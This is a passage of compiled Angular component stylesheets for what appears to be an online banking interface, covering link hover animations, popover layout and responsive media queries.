            margin-left: 8px
        }

        .crawley-content-link[_ngcontent-c13]:hover {
            color: #fff
        }

        .crawley-content[_ngcontent-c13] {
            color: #fff;
            position: relative;
            display: inline-block
        }

        .crawley-content[_ngcontent-c13] i.crawley-content-icon-mobile[_ngcontent-c13] {
            display: none;
            font-size: 19px;
            margin: 0 10px 4px
        }

        .crawley-pipe-left[_ngcontent-c13] {
            width: 1px;
            background: rgba(255, 255, 255, .3);
            height: 17px;
            display: inline-block;
            vertical-align: middle;
            margin-right: 6px
        }

        .crawley-pipe-right[_ngcontent-c13] {
            width: 1px;
            background: rgba(255, 255, 255, .3);
            height: 17px;
            display: inline-block;
            vertical-align: middle;
            margin-left: 6px
        }

        .crawley-content-link[_ngcontent-c13] {
            position: relative;
            z-index: 2;
            display: inline-block;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .crawley-content[_ngcontent-c13] i[_ngcontent-c13] {
            color: #fff;
            font-size: 13px;
            display: inline-block;
            margin-left: 6px;
            margin-right: 12px;
            vertical-align: top;
            margin-top: 5px
        }

        .crawley-content-link-background[_ngcontent-c13] {
            position: absolute;
            width: 80%;
            height: 94%;
            background: 0 0;
            top: 10%;
            left: 10%;
            -webkit-animation: .1s norwich-link-animated-reverse;
            animation: .1s norwich-link-animated-reverse;
            border-radius: 2px
        }

        .crawley-content.z_index[_ngcontent-c13],
        .crawley.z_index[_ngcontent-c13] {
            z-index: 999
        }

        .crawley-content.z_index[_ngcontent-c13] .crawley-content-link-background[_ngcontent-c13],
        .crawley.z_index[_ngcontent-c13] .crawley-content-link-background[_ngcontent-c13] {
            display: none
        }

        .crawley-content[_ngcontent-c13]:hover {
            cursor: pointer
        }

        .crawley-content[_ngcontent-c13]:hover .crawley-content-link-background[_ngcontent-c13] {
            -webkit-animation: .1s norwich-link-animated;
            animation: .1s norwich-link-animated;
            height: 100%;
            top: -6%;
            left: 0;
            width: 100%;
            background: rgba(0, 0, 0, .05)
        }

        .crawley.public[_ngcontent-c13] .crawley-content[_ngcontent-c13]:hover .crawley-content-link-background[_ngcontent-c13] {
            -webkit-animation: .1s norwich-public-link-animated;
            animation: .1s norwich-public-link-animated;
            background: rgba(0, 0, 0, .2)
        }

        @-webkit-keyframes norwich-public-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes norwich-public-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes norwich-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes norwich-link-animated {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes norwich-link-animated-reverse {
            0% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        @keyframes norwich-link-animated-reverse {
            0% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }
        }

        @media only screen and (max-width:639px) {
            .crawley[_ngcontent-c13] {
                margin: -1px 14px 0 0;
                padding-top: 7px
            }

            .crawley-content[_ngcontent-c13] {
                padding: 0
            }

            .crawley-content-link-background[_ngcontent-c13] {
                display: none
            }

            .crawley-pipe-left[_ngcontent-c13] {
                margin-right: 2px;
                margin-top: -5px
            }

            .crawley[_ngcontent-c13] .crawley-content-link-text[_ngcontent-c13],
            .crawley[_ngcontent-c13] .crawley-pipe-right[_ngcontent-c13] {
                display: none
            }

            .crawley-content[_ngcontent-c13] i.crawley-content-icon-mobile[_ngcontent-c13] {
                display: inline-block;
                font-size: 16px;
                margin: 2px 4px 4px
            }

            .crawley-content[_ngcontent-c13] i.crawley-content-icon-arrow[_ngcontent-c13] {
                margin-left: 0;
                margin-top: 6px
            }
        }

        .crawley[_ngcontent-c13] {
            margin-right: 0;
            margin-left: 15px
        }

        .crawley.public[_ngcontent-c13] .crawley-pipe-left[_ngcontent-c13] {
            display: none
        }

        .crawley.public[_ngcontent-c13] .crawley-pipe-right[_ngcontent-c13] {
            width: 1px;
            background: rgba(255, 255, 255, .3);
            height: 17px;
            display: inline-block;
            vertical-align: middle;
            margin-right: 6px
        }

        .crawley.private[_ngcontent-c13] .crawley-pipe-left[_ngcontent-c13] {
            background: #e1e1e1;
            height: 22px;
            display: inline-block;
            vertical-align: top;
            margin-top: 7px
        }

        .crawley.private[_ngcontent-c13] .crawley-pipe-right[_ngcontent-c13] {
            display: none
        }

        .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13],
        .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] i[_ngcontent-c13] {
            color: #4d4d4d
        }

        .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-mobile[_ngcontent-c13] {
            display: inline-block;
            color: #a8a8a8;
            font-size: 30px;
            vertical-align: top;
            margin: -2px 0 0 12px
        }

        .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-icon-arrow[_ngcontent-c13] {
            color: #a8a8a8
        }

        .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link-text[_ngcontent-c13] {
            color: #4d4d4d
        }

        @media only screen and (max-width:1023px) and (min-width:767px) {
            .crawley.private[_ngcontent-c13] {
                margin-left: 8px
            }

            .crawley.private[_ngcontent-c13] .crawley-content-link-text[_ngcontent-c13],
            .crawley.private[_ngcontent-c13] .crawley-pipe-left[_ngcontent-c13] {
                display: none
            }
        }

        @media only screen and (max-width:639px) {
            .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-mobile[_ngcontent-c13] {
                font-size: 23px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .crawley.private[_ngcontent-c13] {
                margin-left: 0
            }

            .crawley.private[_ngcontent-c13] .crawley-pipe-left[_ngcontent-c13] {
                display: none
            }

            .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-mobile[_ngcontent-c13] {
                margin-left: 0
            }

            .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-arrow[_ngcontent-c13] {
                margin-right: 0
            }
        }

        .dark [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-pipe-left[_ngcontent-c13] {
            background: rgba(255, 255, 255, .5)
        }

        .dark [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] i[_ngcontent-c13] {
            color: #fff
        }

        .dark [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-link-text[_ngcontent-c13] {
            color: #fff
        }

        .dark [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-arrow[_ngcontent-c13] {
            color: #fff
        }

        .dark [_nghost-c13]:hover .crawley-content-link-background[_ngcontent-c13] {
            background: rgba(255, 255, 255, .1);
            -webkit-animation: .1s norwich-link-animatedDark;
            animation: .1s norwich-link-animatedDark;
            height: 100%;
            top: -6%;
            left: 0;
            width: 100%
        }

        @-webkit-keyframes norwich-link-animatedDark {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(255, 255, 255, .1)
            }
        }

        @keyframes norwich-link-animatedDark {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: -6%;
                left: 0;
                height: 100%;
                background: rgba(255, 255, 255, .1)
            }
        }

        .light [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-link-text[_ngcontent-c13] {
            color: #333
        }

        .light [_nghost-c13] .crawley.private[_ngcontent-c13] .crawley-content[_ngcontent-c13] .crawley-content-link[_ngcontent-c13] .crawley-content-icon-arrow[_ngcontent-c13] {
            color: #333
        }
    </style>
<style>
        .manchester[_ngcontent-c14] {
            padding: 8px 10px 10px;
            position: fixed;
            z-index: 1000;
            -webkit-animation: .15s ease-in manchester-animated;
            animation: .15s ease-in manchester-animated
        }

        .manchester.disclaimerMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 29px !important
        }

        .manchester.auditInformationMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.configurationByScopeMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.customNotificationMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.customServicesSubscriptionMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.customThirdPartyProdAdminMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.customTransactionHistoryMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.customUserAdministrationMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.frequentTransactionsMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.scheduledTransactionsMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.thirdPartyProdGrListMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
        .manchester.transactionsHistoryMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 19px !important
        }

        .manchester.permissionsConfigurationContextualMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 20px !important
        }

        .manchester.categoryBottomSelector[_ngcontent-c14] {
            right: 5px !important;
            left: 940px !important
        }

        .manchester.categoryBottomSelector[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 2px !important
        }

        .manchester.slimRowMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 15px !important
        }

        .manchester.scheduledMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 168px !important
        }

        .manchester.accountBalanceNotificationDefinitionMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 25px !important
        }

        .manchester.userConfigurationListMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 30px !important
        }

        .manchester.userUtilitiesMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            max-height: none
        }

        .manchester.quickOptionsContextualMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            max-height: 310px
        }

        .manchester.advancedFilterMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            height: 280px
        }

        .manchester.simpleRowContextualInfoMode[_ngcontent-c14] .manchester-content-holder-top[_ngcontent-c14] {
            display: none
        }

        .manchester.listRowMode[_ngcontent-c14] .manchester-content-holder-indicator.userPendingApprovalsMode[_ngcontent-c14] {
            right: 20px !important
        }

        .manchester.listRowMode.scroll-size-4[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 23px !important
        }

        .manchester.listRowMode.scroll-size-8[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 27px !important
        }

        .manchester.listRowMode.scroll-size-12[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 31px !important
        }

        .manchester.listRowMode.scroll-size-16[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 35px !important
        }

        .manchester.listRowMode.scroll-size-20[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 39px !important
        }

        @-webkit-keyframes manchester-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes manchester-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .manchester-content[_ngcontent-c14] {
            position: relative;
            width: 100%
        }

        .manchester-content-holder[_ngcontent-c14] {
            height: 100%;
            border-radius: 6px;
            overflow: hidden;
            -webkit-box-shadow: 0 1px 20px 0 rgba(0, 0, 0, .2);
            box-shadow: 0 1px 20px 0 rgba(0, 0, 0, .2)
        }

        .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
            width: 0;
            height: 0;
            border-left: 7px solid transparent;
            border-right: 7px solid transparent;
            border-bottom: 7px solid #12447f;
            position: absolute;
            top: -6px;
            z-index: 1000
        }

        .manchester.no_header[_ngcontent-c14] .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
            border-bottom: 7px solid #fff
        }

        .manchester-content-holder-indicator.top-fix.right[_ngcontent-c14] {
            right: 35px
        }

        .manchester-content-holder-indicator.top-fix.left[_ngcontent-c14] {
            left: 35px
        }

        .manchester-content-holder-indicator.top-fix.center[_ngcontent-c14] {
            left: 50%
        }

        .manchester-content-holder-indicator.left-fix[_ngcontent-c14] {
            width: 0;
            height: 0;
            border-top: 13px solid transparent;
            border-right: 13px solid #fff;
            border-bottom: 13px solid transparent;
            position: absolute;
            left: -9px;
            z-index: 1000
        }

        .manchester.no_header[_ngcontent-c14] .manchester-content-holder-indicator.left-fix[_ngcontent-c14] {
            border-right: 13px solid #fff
        }

        .manchester-content-holder-indicator.left-fix.top[_ngcontent-c14] {
            top: 15px
        }

        .manchester-content-holder-indicator.left-fix.center[_ngcontent-c14] {
            top: 33%
        }

        .manchester-content-holder-indicator.left-fix.bottom[_ngcontent-c14] {
            bottom: 15px
        }

        .manchester-content-holder-indicator.bottom-fix[_ngcontent-c14] {
            width: 0;
            height: 0;
            border-left: 7px solid transparent;
            border-right: 7px solid transparent;
            border-top: 7px solid #12447f;
            position: absolute;
            bottom: -6px;
            z-index: 1000
        }

        .manchester-content-holder-indicator.bottom-fix.relocated[_ngcontent-c14],
        .manchester.no_header[_ngcontent-c14] .manchester-content-holder-indicator.bottom-fix[_ngcontent-c14] {
            border-top: 7px solid #fff
        }

        .manchester-content-holder-indicator.bottom-fix.right[_ngcontent-c14] {
            right: 35px
        }

        .manchester-content-holder-indicator.bottom-fix.left[_ngcontent-c14] {
            left: 35px
        }

        .manchester-content-holder-indicator.bottom-fix.center[_ngcontent-c14] {
            left: 50%
        }

        .manchester-content-holder-indicator.right-fix[_ngcontent-c14] {
            width: 0;
            height: 0;
            border-top: 13px solid transparent;
            border-left: 13px solid #12447f;
            border-bottom: 13px solid transparent;
            position: absolute;
            left: -12px;
            z-index: 1000
        }

        .manchester-content-holder-indicator.right-fix.relocated[_ngcontent-c14],
        .manchester.no_header[_ngcontent-c14] .manchester-content-holder-indicator.right-fix[_ngcontent-c14] {
            border-left: 13px solid #fff
        }

        .manchester-content-holder-indicator.right-fix.top[_ngcontent-c14] {
            top: 15px
        }

        .manchester-content-holder-indicator.right-fix.center[_ngcontent-c14] {
            top: 33%
        }

        .manchester-content-holder-indicator.right-fix.bottom[_ngcontent-c14] {
            bottom: 15px
        }

        .manchester-content-holder-indicator.right.addNotificationMode[_ngcontent-c14] {
            right: 42px !important
        }

        .manchester-content-holder-indicator.right.addProductMode[_ngcontent-c14] {
            right: 122px !important
        }

        .manchester-content-holder-indicator.right.productSelectorMode[_ngcontent-c14] {
            right: 30px !important
        }

        .manchester-content-holder-indicator.left.catalogSelectorMode[_ngcontent-c14] {
            left: 30px !important
        }

        .manchester-content-holder-indicator.right.catalogSelectorMode[_ngcontent-c14] {
            right: 30px !important
        }

        .manchester-content-holder-top[_ngcontent-c14] {
            width: 100%;
            background: #12447f;
            text-align: left
        }

        .manchester-content-holder-top[_ngcontent-c14] h6[_ngcontent-c14] {
            color: #fff;
            font-size: 14px;
            margin: 0;
            padding: 8px 14px;
            font-weight: 400;
            line-height: 1.43
        }

        .manchester-content-holder-top[_ngcontent-c14] h6[_ngcontent-c14]:empty,
        .manchester.no_header[_ngcontent-c14] .manchester-content-holder-top[_ngcontent-c14] {
            display: none
        }

        .manchester-content-holder-middle[_ngcontent-c14] {
            position: relative;
            width: 100%;
            height: 100%;
            max-height: 380px;
            padding: 0;
            background: #fff;
            overflow-x: hidden;
            word-break: break-word;
            border-radius: 6px
        }

        .manchester-content-holder-middle.has-title[_ngcontent-c14] {
            border-radius: 0 0 6px 6px !important
        }

        .manchester-content-holder-middle.has-footer[_ngcontent-c14] {
            border-radius: 6px 6px 0 0 !important
        }

        .manchester-content-holder-middle.has-title.has-footer[_ngcontent-c14] {
            border-radius: 0 !important
        }

        .manchester-content-holder-footer[_ngcontent-c14] {
            overflow: hidden;
            border-radius: 0 0 6px 6px
        }

        .manchester.no_footer[_ngcontent-c14] .manchester-content-holder-bottom[_ngcontent-c14] {
            display: none
        }

        .dark[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] {
            background: rgba(49, 49, 49, .95)
        }

        .dark[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14],
        .dark[_ngcontent-c14] .manchester-content-holder-top[_ngcontent-c14] {
            background: 0 0
        }

        .dark[_ngcontent-c14] .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
            border-bottom: 7px solid rgba(49, 49, 49, .95)
        }

        .dark[_ngcontent-c14] .manchester-content-holder-indicator.left-fix[_ngcontent-c14] {
            border-right: 13px solid rgba(49, 49, 49, .95)
        }

        .dark[_ngcontent-c14] .manchester-content-holder-indicator.bottom-fix[_ngcontent-c14],
        .dark[_ngcontent-c14] .manchester-content-holder-indicator.bottom-fix.relocated[_ngcontent-c14] {
            border-top: 7px solid rgba(49, 49, 49, .95)
        }

        .dark[_ngcontent-c14] .manchester-content-holder-indicator.right-fix[_ngcontent-c14],
        .dark[_ngcontent-c14] .manchester-content-holder-indicator.right-fix.relocated[_ngcontent-c14] {
            border-left: 13px solid rgba(49, 49, 49, .95)
        }

        .manchester.dark.no_header[_ngcontent-c14] .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
            border-bottom: 7px solid rgba(49, 49, 49, .95)
        }

        .manchester.dark.no_header[_ngcontent-c14] .manchester-content-holder-indicator.left-fix[_ngcontent-c14] {
            border-right: 7px solid rgba(49, 49, 49, .95)
        }

        .manchester.dark.no_header[_ngcontent-c14] .manchester-content-holder-indicator.bottom-fix[_ngcontent-c14] {
            border-top: 7px solid rgba(49, 49, 49, .95)
        }

        .manchester.dark.no_header[_ngcontent-c14] .manchester-content-holder-indicator.right-fix[_ngcontent-c14] {
            border-left: 7px solid rgba(49, 49, 49, .95)
        }

        .manchester-content-header-link[_ngcontent-c14] {
            display: none
        }

        .manchester-content-header-link[_ngcontent-c14] svg.svg-remove-circle[_ngcontent-c14] {
            width: 20px;
            height: 20px
        }

        .manchester-content-header-link[_ngcontent-c14] svg.svg-remove-circle[_ngcontent-c14] circle[_ngcontent-c14] {
            stroke: #fff;
            fill: transparent;
            stroke-width: 1.2
        }

        .manchester-content-header-link[_ngcontent-c14] svg.svg-remove-circle[_ngcontent-c14] line[_ngcontent-c14] {
            stroke: #fff;
            stroke-width: 1.2
        }

        .custom-overlay[_ngcontent-c14] {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 1;
            -moz-opacity: 1
        }

        @-webkit-keyframes manchester-header-link-animated {
            0% {
                -webkit-transform: rotate(90deg) scale(1);
                transform: rotate(90deg) scale(1)
            }

            100% {
                -webkit-transform: rotate(0) scale(1);
                transform: rotate(0) scale(1)
            }
        }

        @keyframes manchester-header-link-animated {
            0% {
                -webkit-transform: rotate(90deg) scale(1);
                transform: rotate(90deg) scale(1)
            }

            100% {
                -webkit-transform: rotate(0) scale(1);
                transform: rotate(0) scale(1)
            }
        }

        @-webkit-keyframes manchester-header-link-reverse {
            0% {
                -webkit-transform: rotate(0) scale(1);
                transform: rotate(0) scale(1)
            }

            100% {
                -webkit-transform: rotate(90deg) scale(1);
                transform: rotate(90deg) scale(1)
            }
        }

        @keyframes manchester-header-link-reverse {
            0% {
                -webkit-transform: rotate(0) scale(1);
                transform: rotate(0) scale(1)
            }

            100% {
                -webkit-transform: rotate(90deg) scale(1);
                transform: rotate(90deg) scale(1)
            }
        }

        @media only screen and (min-width:1366px) {
            .manchester.productSelectorMode.quickOptionsMode[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 100%
            }
        }

        @media only screen and (min-width:1025px) {
            .manchester[class*=quickoptions][_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                top: 40px
            }

            .manchester.fullHeightOverlapping.quickoptions_transfers[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                top: 230px
            }

            .manchester.fullHeightOverlapping.quickoptions_payments[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                top: 310px
            }

            .manchester.fullHeightOverlapping.quickoptions_manage[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                top: 390px
            }

            .manchester.fullHeightOverlapping.quickoptions_administration[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                top: 470px
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {

            .manchester.customProductGroupMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14],
            .manchester.customProductMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                right: 17px !important
            }
        }

        @media only screen and (max-width:1023px) and (min-width:640px) {
            .manchester.viewSelectorMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                right: 16px !important
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .manchester.viewSelectorMode[_ngcontent-c14] {
                margin-top: 4px
            }

            .manchester.viewSelectorMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                right: 30px !important
            }

            .manchester.inboxMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 100%
            }

            .fullscreen[_ngcontent-c14] {
                margin: 5px;
                padding: 0;
                width: auto !important;
                height: calc(100% - 10px) !important;
                top: 0 !important;
                left: 0 !important;
                bottom: 0 !important;
                right: 0 !important
            }

            .fullscreen[_ngcontent-c14] .manchester-content[_ngcontent-c14] {
                width: 100%;
                height: 100%
            }

            .fullscreen[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                display: none
            }

            .fullscreen[_ngcontent-c14] .manchester-content-holder-top[_ngcontent-c14] {
                border-top-left-radius: 0;
                border-top-right-radius: 0
            }

            .fullscreen[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: calc(100% - 40px);
                max-height: none
            }

            .fullscreen[_ngcontent-c14] .manchester-content-holder-middle.has-footer[_ngcontent-c14] {
                height: calc(100% - 80px)
            }

            .fullscreen[_ngcontent-c14] .manchester-content-holder-bottom[_ngcontent-c14] {
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0
            }

            .fullscreen[_ngcontent-c14] .manchester-content-header-link[_ngcontent-c14] {
                display: block;
                width: 40px;
                color: #fff;
                padding-top: 10px;
                text-align: center;
                height: 40px;
                cursor: pointer;
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg);
                -webkit-animation: .25s parma-header-link-animated;
                animation: .25s parma-header-link-animated
            }

            .fullscreen[_ngcontent-c14] .manchester-content-header-link[_ngcontent-c14] i[_ngcontent-c14] {
                font-size: 20px
            }

            .fullscreen[_ngcontent-c14] .manchester-content-header-link[_ngcontent-c14]:focus i[_ngcontent-c14],
            .fullscreen[_ngcontent-c14] .manchester-content-header-link[_ngcontent-c14]:hover i[_ngcontent-c14] {
                color: #fff
            }

            .fullscreen[_ngcontent-c14] .manchester-content-header-link[_ngcontent-c14]:hover {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg);
                -webkit-animation: .25s parma-header-link-reverse;
                animation: .25s parma-header-link-reverse
            }
        }

        @media screen and (max-width:767px) and (min-width:320px) {
            .manchester.accountDetailsTabsMode.tabsMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
                right: 12px !important
            }
        }

        @media screen and (max-width:639px) and (min-width:320px) {
            .fullscreen[_ngcontent-c14] .manchester-content-holder-top[_ngcontent-c14] h6[_ngcontent-c14] {
                font-size: 18px
            }
        }

        @media screen and (min-width:640px) {
            .manchester.addProductMode[_ngcontent-c14] {
                left: initial !important;
                right: 8px
            }

            .manchester.productSelectorMode.fullHeightOverlapping[_ngcontent-c14] {
                top: 0 !important;
                bottom: 0 !important;
                height: auto !important
            }

            .manchester.productSelectorMode.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] {
                height: 100%
            }

            .manchester.productSelectorMode.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: none;
                height: calc(100% - 36px)
            }

            .manchester.productSelectorMode.fullHeightOverlapping.no_header[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: 100%
            }

            .manchester.productSelectorMode.fullHeightOverlapping.thirdPartyProductSelectorMode[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: calc(100% - 36px)
            }

            .manchester.productSelectorMode.fullHeightOverlapping.addHocServiceSelectorMode.last-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14],
            .manchester.productSelectorMode.fullHeightOverlapping.preRegisteredServiceSelectorMode.first-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14],
            .manchester.productSelectorMode.fullHeightOverlapping.preRegisteredServiceSelectorMode.last-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] {
                height: 100%
            }

            .manchester.userConfigurationListMode[_ngcontent-c14] {
                width: 300px !important
            }

            .manchester.productSelectorMode.fullHeightOverlapping.addHocServiceSelectorMode.last-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: calc(100% - 40px - 42px)
            }

            .manchester.productSelectorMode.fullHeightOverlapping.preRegisteredServiceSelectorMode.first-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: calc(100% - 40px - 30px)
            }

            .manchester.productSelectorMode.fullHeightOverlapping.preRegisteredServiceSelectorMode.last-step[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                height: calc(100% - 40px - 42px)
            }
        }

        @media screen and (max-width:1023px) and (min-width:320px) {
            .manchester.listDetailMode[_ngcontent-c14] .manchester-content-holder-indicator.right[_ngcontent-c14] {
                right: 20px !important
            }
        }

        @media screen and (min-width:640px) and (max-height:767px) and (min-height:640px) {
            .manchester.listRowMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 250px
            }
        }

        @media screen and (min-width:640px) and (max-height:639px) and (min-height:480px) {
            .manchester.quickOptionsMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 350px
            }

            .manchester.listDetailMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 320px
            }
        }

        @media screen and (min-width:640px) and (max-height:639px) and (min-height:320px) {
            .manchester.listRowMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 180px
            }
        }

        @media screen and (min-width:640px) and (max-height:479px) and (min-height:320px) {
            .manchester.quickOptionsMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 200px
            }

            .manchester.listDetailMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 180px
            }

            .manchester.userUtilitiesMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
                max-height: 200px
            }
        }

        .backoffice [_nghost-c14] .manchester-content-holder-top[_ngcontent-c14] {
            background: #333
        }

        .backoffice [_nghost-c14] .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
            border-bottom: 7px solid #333
        }

        .backoffice [_nghost-c14] .manchester.propertiesFiledBOMode[_ngcontent-c14] {
            bottom: 100px
        }

        .backoffice [_nghost-c14] .manchester.propertiesFiledBOMode[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            display: none
        }

        .backoffice [_nghost-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            max-height: 300px
        }

        .manchester.transactionsHistoryMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            right: 20px !important
        }

        .manchester.dashboardContextualMode[_ngcontent-c14] .manchester-content-holder-indicator[_ngcontent-c14] {
            left: 30px !important
        }

